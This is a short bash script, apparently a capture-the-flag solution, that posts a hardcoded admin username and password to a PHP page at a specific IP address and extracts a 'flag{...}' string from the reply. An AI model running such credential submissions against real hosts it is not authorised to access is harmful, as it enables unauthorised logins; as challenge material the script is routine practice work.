#!/bin/bash


curl -s -d "username=admin&password=71urlkufpsdnlkadsf" -X POST http://165.227.106.113/post.php | grep -oE flag{.*} --color=none
